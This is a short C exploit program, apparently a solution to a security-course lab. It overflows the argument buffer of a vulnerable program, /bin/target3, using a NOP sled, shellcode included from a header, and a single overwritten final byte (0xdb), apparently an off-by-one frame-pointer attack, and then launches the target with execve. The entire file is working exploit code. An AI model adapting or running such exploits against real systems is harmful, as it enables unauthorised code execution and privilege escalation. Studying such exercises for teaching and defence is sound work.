#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/bin/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[281];
  memset(buf, 0x90, sizeof(buf)-1);
  memcpy(buf, shellcode, sizeof(shellcode)-1);
  *(unsigned char*) (buf + 280) = 0xdb; 
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
